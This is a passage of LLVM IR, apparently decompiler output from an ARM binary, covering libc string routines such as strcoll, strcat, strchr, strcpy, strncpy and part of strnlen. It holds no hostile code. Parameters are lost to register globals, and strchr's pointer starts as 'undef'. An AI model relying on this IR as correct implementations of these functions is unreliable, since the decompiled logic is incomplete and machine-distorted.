  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 20, 19, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 1, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14ee8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_14ec0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14f24.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_14f24 = phi i32 [ %v0_14f24.pre, %bb ], [ %v5_14f24, %bb3 ]
  %v0_14f20 = phi i32 [ %tmp, %bb ], [ %v5_14f20, %bb3 ]
  %v1_14f20 = inttoptr i32 %v0_14f20 to i8*
  %v2_14f20 = load i8, i8* %v1_14f20, align 1
  %v3_14f20 = zext i8 %v2_14f20 to i32
  store i32 %v3_14f20, i32* @r2, align 4
  %v1_14f24 = inttoptr i32 %v0_14f24 to i8*
  %v2_14f24 = load i8, i8* %v1_14f24, align 1
  %v3_14f24 = zext i8 %v2_14f24 to i32
  %v2_14f28 = icmp eq i8 %v2_14f20, 0
  br i1 %v2_14f28, label %.dec_label_pc_14f34_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_14f24 = add i32 %v0_14f24, 1
  %v5_14f20 = add i32 %v0_14f20, 1
  %v10_14f2c = icmp eq i8 %v2_14f20, %v2_14f24
  br i1 %v10_14f2c, label %entry, label %dec_label_pc_14f34

.dec_label_pc_14f34_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %bb3, %.dec_label_pc_14f34_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_14f34_crit_edge ], [ %v3_14f20, %bb3 ]
  %v2_14f34.pre-phi = sub nsw i32 %.pn, %v3_14f24
  ret i32 %v2_14f34.pre-phi

; uselistorder directives
  uselistorder i32 %v0_14f20, { 1, 0 }
  uselistorder i32 %v0_14f24, { 1, 0 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14fa4

dec_label_pc_14fa4:                               ; preds = %dec_label_pc_14fa4, %entry
  %v0_14fa4 = phi i32 [ %v5_14fa4, %dec_label_pc_14fa4 ], [ %tmp, %entry ]
  %v1_14fa4 = inttoptr i32 %v0_14fa4 to i8*
  %v2_14fa4 = load i8, i8* %v1_14fa4, align 1
  %v5_14fa4 = add i32 %v0_14fa4, 1
  store i32 %v5_14fa4, i32* %r2.global-to-local, align 4
  %v2_14fa8 = icmp eq i8 %v2_14fa4, 0
  store i1 %v2_14fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fa8, label %dec_label_pc_14fb0, label %dec_label_pc_14fa4

dec_label_pc_14fb0:                               ; preds = %dec_label_pc_14fa4
  %v1_14fb0 = add i32 %v0_14fa4, -1
  store i32 %v1_14fb0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14fb4

dec_label_pc_14fb4:                               ; preds = %dec_label_pc_14fb4, %dec_label_pc_14fb0
  %v2_14fbc = phi i32 [ %v6_14fbc, %dec_label_pc_14fb4 ], [ %v1_14fb0, %dec_label_pc_14fb0 ]
  %v0_14fb4 = load i32, i32* @r1, align 4
  %v1_14fb4 = inttoptr i32 %v0_14fb4 to i8*
  %v2_14fb4 = load i8, i8* %v1_14fb4, align 1
  %v5_14fb4 = add i32 %v0_14fb4, 1
  store i32 %v5_14fb4, i32* @r1, align 4
  %v2_14fb8 = icmp eq i8 %v2_14fb4, 0
  store i1 %v2_14fb8, i1* %cpsr_z.global-to-local, align 1
  %v3_14fbc = add i32 %v2_14fbc, 1
  %v4_14fbc = inttoptr i32 %v3_14fbc to i8*
  store i8 %v2_14fb4, i8* %v4_14fbc, align 1
  %v5_14fbc = load i32, i32* %r2.global-to-local, align 4
  %v6_14fbc = add i32 %v5_14fbc, 1
  store i32 %v6_14fbc, i32* %r2.global-to-local, align 4
  %v0_14fc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14fc0, label %dec_label_pc_14fc4, label %dec_label_pc_14fb4

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14fb4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14fbc, { 1, 0 }
  uselistorder i32 %v5_14fa4, { 1, 0 }
  uselistorder i32 %v0_14fa4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_14fc8 = load i32, i32* @r5, align 4
  %v9_14fc8 = load i32, i32* @r6, align 4
  %v1_14fcc = urem i32 %arg1, 256
  br label %dec_label_pc_14fec

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fec
  %v3_14fd4 = load i8, i8* %.0, align 1
  %v4_14fd4 = zext i8 %v3_14fd4 to i32
  %v9_14fd8 = icmp eq i32 %v4_14fd4, %v1_14fcc
  br i1 %v9_14fd8, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_14fd4
  ret i32 %v1_14fec

bb24:                                             ; preds = %dec_label_pc_14fd4
  %v2_14fe0 = icmp eq i8 %v3_14fd4, 0
  %v2_14fe4 = add i32 %v1_14fec, 1
  %v3_14fe4 = inttoptr i32 %v2_14fe4 to i8*
  br i1 %v2_14fe0, label %dec_label_pc_150c0, label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_14fe4, %bb24 ]
  %v1_14fec = ptrtoint i8* %.0 to i32
  %v2_14fec = urem i32 %v1_14fec, 4
  %v3_14fec = icmp eq i32 %v2_14fec, 0
  br i1 %v3_14fec, label %dec_label_pc_14ff4, label %dec_label_pc_14fd4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fec
  %v4_14ff4 = mul nuw nsw i32 %v1_14fcc, 256
  %v5_14ff4 = or i32 %v4_14ff4, %v1_14fcc
  %v4_14ffc = mul i32 %v5_14ff4, 65536
  %v5_14ffc = or i32 %v4_14ffc, %v5_14ff4
  br label %dec_label_pc_15000

dec_label_pc_15000:                               ; preds = %dec_label_pc_150b8, %dec_label_pc_15040, %dec_label_pc_14ff4
  %v0_15064 = phi i32 [ %v1_14fec, %dec_label_pc_14ff4 ], [ %v4_15000, %dec_label_pc_15040 ], [ %v4_15000, %dec_label_pc_150b8 ]
  %v1_15000 = inttoptr i32 %v0_15064 to i32*
  %v2_15000 = load i32, i32* %v1_15000, align 4
  %v4_15000 = add i32 %v0_15064, 4
  %v2_15008 = xor i32 %v2_15000, %v5_14ffc
  %v2_15014 = add i32 %v2_15000, 2130640639
  %v1_15018 = sub i32 -1, %v2_15000
  %v2_1501c = xor i32 %v2_15014, %v1_15018
  %v2_15020 = add i32 %v2_15008, 2130640639
  %v1_15028 = sub i32 -1, %v2_15008
  %v2_1502c = and i32 %v2_1501c, -2130640640
  %v2_15030 = xor i32 %v2_15020, %v1_15028
  %v2_15034 = icmp eq i32 %v2_1502c, 0
  %v2_15038 = and i32 %v2_15030, -2130640640
  store i32 %v2_15038, i32* @lr, align 4
  br i1 %v2_15034, label %dec_label_pc_15040, label %dec_label_pc_15048

dec_label_pc_15040:                               ; preds = %dec_label_pc_15000
  %v2_15040 = icmp eq i32 %v2_15038, 0
  br i1 %v2_15040, label %dec_label_pc_15000, label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %dec_label_pc_15000, %dec_label_pc_15040
  %v2_15048 = inttoptr i32 %v0_15064 to i8*
  %v3_15048 = load i8, i8* %v2_15048, align 1
  %v4_15048 = zext i8 %v3_15048 to i32
  %v1_15050 = add i32 %v0_15064, 1
  %v1_15054 = add i32 %v0_15064, 2
  %v9_15058 = icmp eq i32 %v4_15048, %v1_14fcc
  %v1_1505c = add i32 %v0_15064, 3
  store i32 %v1_1505c, i32* @ip, align 4
  br i1 %v9_15058, label %dec_label_pc_15064, label %dec_label_pc_1506c

dec_label_pc_15064:                               ; preds = %dec_label_pc_15048
  store i32 %v6_14fc8, i32* @r5, align 4
  store i32 %v9_14fc8, i32* @r6, align 4
  ret i32 %v0_15064

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15048
  %v2_1506c = icmp eq i8 %v3_15048, 0
  br i1 %v2_1506c, label %dec_label_pc_150c0, label %dec_label_pc_15074

dec_label_pc_15074:                               ; preds = %dec_label_pc_1506c
  %v2_15074 = inttoptr i32 %v1_15050 to i8*
  %v3_15074 = load i8, i8* %v2_15074, align 1
  %v4_15074 = zext i8 %v3_15074 to i32
  %v9_15078 = icmp eq i32 %v4_15074, %v1_14fcc
  br i1 %v9_15078, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_15074
  store i32 %v6_14fc8, i32* @r5, align 4
  store i32 %v9_14fc8, i32* @r6, align 4
  ret i32 %v1_15050

bb26:                                             ; preds = %dec_label_pc_15074
  %v2_15080 = icmp eq i8 %v3_15074, 0
  br i1 %v2_15080, label %dec_label_pc_150c0, label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %bb26
  %v2_15088 = inttoptr i32 %v1_15054 to i8*
  %v3_15088 = load i8, i8* %v2_15088, align 1
  %v4_15088 = zext i8 %v3_15088 to i32
  %v9_1508c = icmp eq i32 %v4_15088, %v1_14fcc
  br i1 %v9_1508c, label %dec_label_pc_15094, label %dec_label_pc_1509c

dec_label_pc_15094:                               ; preds = %dec_label_pc_15088
  store i32 %v6_14fc8, i32* @r5, align 4
  store i32 %v9_14fc8, i32* @r6, align 4
  ret i32 %v1_15054

dec_label_pc_1509c:                               ; preds = %dec_label_pc_15088
  %v2_1509c = icmp eq i8 %v3_15088, 0
  br i1 %v2_1509c, label %dec_label_pc_150c0, label %dec_label_pc_150a4

dec_label_pc_150a4:                               ; preds = %dec_label_pc_1509c
  %v2_150a4 = inttoptr i32 %v1_1505c to i8*
  %v3_150a4 = load i8, i8* %v2_150a4, align 1
  %v4_150a4 = zext i8 %v3_150a4 to i32
  %v9_150a8 = icmp eq i32 %v4_150a4, %v1_14fcc
  br i1 %v9_150a8, label %dec_label_pc_150b0, label %dec_label_pc_150b8

dec_label_pc_150b0:                               ; preds = %dec_label_pc_150a4
  store i32 %v6_14fc8, i32* @r5, align 4
  store i32 %v9_14fc8, i32* @r6, align 4
  ret i32 %v1_1505c

dec_label_pc_150b8:                               ; preds = %dec_label_pc_150a4
  %v2_150b8 = icmp eq i8 %v3_150a4, 0
  br i1 %v2_150b8, label %dec_label_pc_150c0, label %dec_label_pc_15000

dec_label_pc_150c0:                               ; preds = %bb24, %dec_label_pc_150b8, %dec_label_pc_1509c, %bb26, %dec_label_pc_1506c
  store i32 %v6_14fc8, i32* @r5, align 4
  store i32 %v9_14fc8, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_15000, { 1, 0 }
  uselistorder i32 %v2_15000, { 0, 2, 1 }
  uselistorder i32 %v0_15064, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14ff4, { 1, 0 }
  uselistorder i32 %v1_14fec, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_14fcc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_14fc8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_14fc8, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_150c0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15048, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_150d0 = sub i32 %arg1, %tmp
  %v1_150d4 = add i32 %v2_150d0, -1
  store i32 %v1_150d4, i32* %r2.global-to-local, align 4
  %v2_150d84 = load i8, i8* %arg2, align 1
  %v5_150d86 = add i32 %tmp, 1
  store i32 %v5_150d86, i32* %r1.global-to-local, align 4
  %v2_150dc7 = icmp eq i8 %v2_150d84, 0
  store i1 %v2_150dc7, i1* %cpsr_z.global-to-local, align 1
  %v5_150e08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_150d84, i8* %v5_150e08, align 1
  %v0_150e49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_150e49, label %dec_label_pc_150e8, label %dec_label_pc_150d8.dec_label_pc_150d8_crit_edge

dec_label_pc_150d8.dec_label_pc_150d8_crit_edge:  ; preds = %entry, %dec_label_pc_150d8.dec_label_pc_150d8_crit_edge
  %v0_150d8.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_150e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_150d8 = inttoptr i32 %v0_150d8.pre to i8*
  %v2_150d8 = load i8, i8* %v1_150d8, align 1
  %v5_150d8 = add i32 %v0_150d8.pre, 1
  store i32 %v5_150d8, i32* %r1.global-to-local, align 4
  %v2_150dc = icmp eq i8 %v2_150d8, 0
  store i1 %v2_150dc, i1* %cpsr_z.global-to-local, align 1
  %v4_150e0 = add i32 %v5_150d8, %v3_150e0.pre
  %v5_150e0 = inttoptr i32 %v4_150e0 to i8*
  store i8 %v2_150d8, i8* %v5_150e0, align 1
  %v0_150e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_150e4, label %dec_label_pc_150e8, label %dec_label_pc_150d8.dec_label_pc_150d8_crit_edge

dec_label_pc_150e8:                               ; preds = %dec_label_pc_150d8.dec_label_pc_150d8_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150d8.dec_label_pc_150d8_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_150ec = icmp eq i32 %arg2, 3
  store i1 %v7_150ec, i1* %cpsr_z.global-to-local, align 1
  %v1_150f4 = add i32 %arg1, -1
  store i32 %v1_150f4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15170, label %dec_label_pc_150fc

dec_label_pc_150fc:                               ; preds = %entry
  %v3_150fc = udiv i32 %arg2, 4
  store i32 %v3_150fc, i32* @lr, align 4
  %v0_15100.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_1514c, %dec_label_pc_150fc
  %v2_15108 = phi i32 [ %v6_15140, %dec_label_pc_1514c ], [ %v1_150f4, %dec_label_pc_150fc ]
  %v0_15100 = phi i32 [ %v1_15150, %dec_label_pc_1514c ], [ %v0_15100.pre, %dec_label_pc_150fc ]
  %v1_15100 = inttoptr i32 %v0_15100 to i8*
  %v2_15100 = load i8, i8* %v1_15100, align 1
  %v3_15100 = zext i8 %v2_15100 to i32
  store i32 %v3_15100, i32* %r3.global-to-local, align 4
  %v2_15104 = icmp eq i8 %v2_15100, 0
  store i1 %v2_15104, i1* %cpsr_z.global-to-local, align 1
  %v3_15108 = add i32 %v2_15108, 1
  %v4_15108 = inttoptr i32 %v3_15108 to i8*
  store i8 %v2_15100, i8* %v4_15108, align 1
  %v5_15108 = load i32, i32* %ip.global-to-local, align 4
  %v6_15108 = add i32 %v5_15108, 1
  store i32 %v6_15108, i32* %ip.global-to-local, align 4
  %v0_1510c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1510c, label %dec_label_pc_1515c, label %dec_label_pc_15110

dec_label_pc_15110:                               ; preds = %dec_label_pc_15100
  %v0_15110 = load i32, i32* @r1, align 4
  %v1_15110 = add i32 %v0_15110, 1
  %v2_15110 = inttoptr i32 %v1_15110 to i8*
  %v3_15110 = load i8, i8* %v2_15110, align 1
  %v4_15110 = zext i8 %v3_15110 to i32
  store i32 %v4_15110, i32* %r3.global-to-local, align 4
  %v2_15114 = icmp eq i8 %v3_15110, 0
  store i1 %v2_15114, i1* %cpsr_z.global-to-local, align 1
  %v3_15118 = add i32 %v5_15108, 2
  %v4_15118 = inttoptr i32 %v3_15118 to i8*
  store i8 %v3_15110, i8* %v4_15118, align 1
  %v5_15118 = load i32, i32* %ip.global-to-local, align 4
  %v6_15118 = add i32 %v5_15118, 1
  store i32 %v6_15118, i32* %ip.global-to-local, align 4
  %v0_1511c = load i32, i32* @r1, align 4
  %v1_1511c = add i32 %v0_1511c, 1
  store i32 %v1_1511c, i32* %r1.global-to-local, align 4
  %v0_15120 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15120, label %dec_label_pc_1515c, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_15110
  %v1_15124 = add i32 %v0_1511c, 2
  %v2_15124 = inttoptr i32 %v1_15124 to i8*
  %v3_15124 = load i8, i8* %v2_15124, align 1
  %v4_15124 = zext i8 %v3_15124 to i32
  store i32 %v4_15124, i32* %r3.global-to-local, align 4
  %v2_15128 = icmp eq i8 %v3_15124, 0
  store i1 %v2_15128, i1* %cpsr_z.global-to-local, align 1
  %v3_1512c = add i32 %v5_15118, 2
  %v4_1512c = inttoptr i32 %v3_1512c to i8*
  store i8 %v3_15124, i8* %v4_1512c, align 1
  %v5_1512c = load i32, i32* %ip.global-to-local, align 4
  %v6_1512c = add i32 %v5_1512c, 1
  store i32 %v6_1512c, i32* %ip.global-to-local, align 4
  %v0_15130 = load i32, i32* %r1.global-to-local, align 4
  %v1_15130 = add i32 %v0_15130, 1
  store i32 %v1_15130, i32* %r1.global-to-local, align 4
  %v0_15134 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15134, label %dec_label_pc_1515c, label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_15124
  %v1_15138 = add i32 %v0_15130, 2
  %v2_15138 = inttoptr i32 %v1_15138 to i8*
  %v3_15138 = load i8, i8* %v2_15138, align 1
  %v4_15138 = zext i8 %v3_15138 to i32
  store i32 %v4_15138, i32* %r3.global-to-local, align 4
  %v2_1513c = icmp eq i8 %v3_15138, 0
  store i1 %v2_1513c, i1* %cpsr_z.global-to-local, align 1
  %v3_15140 = add i32 %v5_1512c, 2
  %v4_15140 = inttoptr i32 %v3_15140 to i8*
  store i8 %v3_15138, i8* %v4_15140, align 1
  %v5_15140 = load i32, i32* %ip.global-to-local, align 4
  %v6_15140 = add i32 %v5_15140, 1
  store i32 %v6_15140, i32* %ip.global-to-local, align 4
  %v0_15144 = load i32, i32* %r1.global-to-local, align 4
  %v1_15144 = add i32 %v0_15144, 1
  store i32 %v1_15144, i32* %r1.global-to-local, align 4
  %v0_15148 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15148, label %dec_label_pc_1515c, label %dec_label_pc_1514c

dec_label_pc_1514c:                               ; preds = %dec_label_pc_15138
  %v0_1514c = load i32, i32* @lr, align 4
  %v1_1514c = add i32 %v0_1514c, -1
  store i32 %v1_1514c, i32* @lr, align 4
  %v7_1514c = icmp eq i32 %v0_1514c, 1
  store i1 %v7_1514c, i1* %cpsr_z.global-to-local, align 1
  %v1_15150 = add i32 %v0_15144, 2
  store i32 %v1_15150, i32* @r1, align 4
  br i1 %v7_1514c, label %dec_label_pc_15170, label %dec_label_pc_15100

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15138, %dec_label_pc_15124, %dec_label_pc_15110, %dec_label_pc_15100
  %v1_1515c = phi i32 [ %v6_15140, %dec_label_pc_15138 ], [ %v6_1512c, %dec_label_pc_15124 ], [ %v6_15118, %dec_label_pc_15110 ], [ %v6_15108, %dec_label_pc_15100 ]
  %v2_1515c1 = sub i32 %arg1, %v1_1515c
  %v2_15160 = add i32 %v2_1515c1, %arg2
  store i32 %v2_15160, i32* %r3.global-to-local, align 4
  %v1_15164 = add i32 %v2_15160, -1
  store i32 %v1_15164, i32* %r2.global-to-local, align 4
  %v7_15164 = icmp eq i32 %v2_15160, 1
  store i1 %v7_15164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15164, label %bb, label %dec_label_pc_15190

bb:                                               ; preds = %dec_label_pc_1515c
  ret i32 %arg1

dec_label_pc_15170:                               ; preds = %dec_label_pc_1514c, %entry
  %v2_151806 = phi i32 [ %v1_150f4, %entry ], [ %v6_15140, %dec_label_pc_1514c ]
  %v1_15170 = urem i32 %arg2, 4
  store i32 %v1_15170, i32* %r2.global-to-local, align 4
  %v2_15170 = icmp eq i32 %v1_15170, 0
  store i1 %v2_15170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15170, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_15170
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_15170, %._crit_edge
  %v2_15180 = phi i32 [ %v6_15180, %._crit_edge ], [ %v2_151806, %dec_label_pc_15170 ]
  %v0_1517c = phi i32 [ %v0_1517c.pre, %._crit_edge ], [ %v1_15170, %dec_label_pc_15170 ]
  %v0_15178 = load i32, i32* @r1, align 4
  %v1_15178 = inttoptr i32 %v0_15178 to i8*
  %v2_15178 = load i8, i8* %v1_15178, align 1
  %v3_15178 = zext i8 %v2_15178 to i32
  store i32 %v3_15178, i32* %r3.global-to-local, align 4
  %v5_15178 = add i32 %v0_15178, 1
  store i32 %v5_15178, i32* @r1, align 4
  %v1_1517c = add i32 %v0_1517c, -1
  store i32 %v1_1517c, i32* %r2.global-to-local, align 4
  %v7_1517c = icmp eq i32 %v0_1517c, 1
  store i1 %v7_1517c, i1* %cpsr_z.global-to-local, align 1
  %v3_15180 = add i32 %v2_15180, 1
  %v4_15180 = inttoptr i32 %v3_15180 to i8*
  store i8 %v2_15178, i8* %v4_15180, align 1
  %v5_15180 = load i32, i32* %ip.global-to-local, align 4
  %v6_15180 = add i32 %v5_15180, 1
  store i32 %v6_15180, i32* %ip.global-to-local, align 4
  %v0_15184 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15184, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_15188 = load i32, i32* %r3.global-to-local, align 4
  %v2_15188 = icmp eq i32 %v0_15188, 0
  store i1 %v2_15188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15188, label %dec_label_pc_15190, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_1517c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_15190:                               ; preds = %dec_label_pc_1515c, %bb13, %dec_label_pc_15190
  %v2_15198 = phi i32 [ %v6_15198, %dec_label_pc_15190 ], [ %v1_1515c, %dec_label_pc_1515c ], [ %v6_15180, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15194 = load i32, i32* %r2.global-to-local, align 4
  %v1_15194 = add i32 %v0_15194, -1
  store i32 %v1_15194, i32* %r2.global-to-local, align 4
  %v7_15194 = icmp eq i32 %v0_15194, 1
  store i1 %v7_15194, i1* %cpsr_z.global-to-local, align 1
  %v3_15198 = add i32 %v2_15198, 1
  %v4_15198 = inttoptr i32 %v3_15198 to i8*
  store i8 0, i8* %v4_15198, align 1
  %v5_15198 = load i32, i32* %ip.global-to-local, align 4
  %v6_15198 = add i32 %v5_15198, 1
  store i32 %v6_15198, i32* %ip.global-to-local, align 4
  %v0_1519c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1519c, label %dec_label_pc_151a0, label %dec_label_pc_15190

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15190
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15198, { 1, 0 }
  uselistorder i32 %v0_15194, { 1, 0 }
  uselistorder i32 %v6_15180, { 0, 2, 1 }
  uselistorder i32 %v1_15170, { 2, 1, 0 }
  uselistorder i32 %v2_15160, { 2, 1, 0 }
  uselistorder i32 %v1_15150, { 1, 0 }
  uselistorder i32 %v0_1514c, { 1, 0 }
  uselistorder i32 %v6_15140, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_15190, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_151a4 = load i32, i32* @r1, align 4
  %v2_151a4 = icmp eq i32 %v0_151a4, 0
  br i1 %v2_151a4, label %bb, label %dec_label_pc_151d4

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_151bc:                               ; preds = %dec_label_pc_151e4
  %v3_151bc = icmp uge i32 %v5_15270, %v1_151bc
  %v9_151bc = icmp eq i32 %v5_15270, %v1_151bc
  %v2_151c0 = xor i1 %v3_151bc, true
  %v3_151c0 = or i1 %v9_151bc, %v2_151c0
  br i1 %v3_151c0, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_151bc
  %v6_151c0 = sub i32 %v5_15270, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_151bc, %bb19
  %v5_151c4 = phi i32 [ %v1_151bc, %dec_label_pc_151bc ], [ %v6_151c0, %bb19 ]
  %v2_151c4 = xor i1 %v9_151bc, true
  %v3_151c4 = and i1 %v3_151bc, %v2_151c4
  br i1 %v3_151c4, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_151c4 = sub i32 %v5_151c4, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_151c8 = phi i32 [ %v5_151c4, %bb20 ], [ %v6_151c4, %bb21 ]
  ret i32 %v8_151c8

dec_label_pc_151cc:                               ; preds = %dec_label_pc_15218
  br label %dec_label_pc_1526c

dec_label_pc_151d4:                               ; preds = %entry
  %v2_151d4 = add i32 %tmp, %v0_151a4
  %v3_151d4 = icmp ult i32 %v2_151d4, %tmp
  br i1 %v3_151d4, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_151d4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_151d4, %bb23
  %v5_15270 = phi i32 [ %v2_151d4, %dec_label_pc_151d4 ], [ -1, %bb23 ]
  %v1_151f42 = urem i32 %tmp, 4
  %v2_151f43 = icmp eq i32 %v1_151f42, 0
  br i1 %v2_151f43, label %dec_label_pc_151fc, label %dec_label_pc_151e4

dec_label_pc_151e4:                               ; preds = %bb24, %dec_label_pc_151f0
  %v1_151bc = phi i32 [ %v1_151f0, %dec_label_pc_151f0 ], [ %tmp, %bb24 ]
  %v1_151e4 = inttoptr i32 %v1_151bc to i8*
  %v2_151e4 = load i8, i8* %v1_151e4, align 1
  %v2_151e8 = icmp eq i8 %v2_151e4, 0
  br i1 %v2_151e8, label %dec_label_pc_151bc, label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e4
  %v1_151f0 = add i32 %v1_151bc, 1
  %v1_151f4 = urem i32 %v1_151f0, 4
  %v2_151f4 = icmp eq i32 %v1_151f4, 0
  br i1 %v2_151f4, label %dec_label_pc_151fc, label %dec_label_pc_151e4

dec_label_pc_151fc:                               ; preds = %dec_label_pc_151f0, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_151f0, %dec_label_pc_151f0 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_1525c32 = icmp ult i32 %storemerge.lcssa, %v5_15270
  br i1 %v3_1525c32, label %dec_label_pc_15204, label %dec_label_pc_1526c

dec_label_pc_15204:                               ; preds = %dec_label_pc_15258, %dec_label_pc_151fc
  %v0_151cc39 = phi i32 [ %v4_15204, %dec_label_pc_15258 ], [ %storemerge.lcssa, %dec_label_pc_151fc ]
  %v1_15204 = inttoptr i32 %v0_151cc39 to i32*
  %v2_15204 = load i32, i32* %v1_15204, align 4
  %v4_15204 = add i32 %v0_151cc39, 4
  store i32 %v4_15204, i32* @lr, align 4
  %v2_15208 = add i32 %v2_15204, -16843009
  %v2_1520c = and i32 %v2_15208, -2139062144
  %v2_15210 = icmp eq i32 %v2_1520c, 0
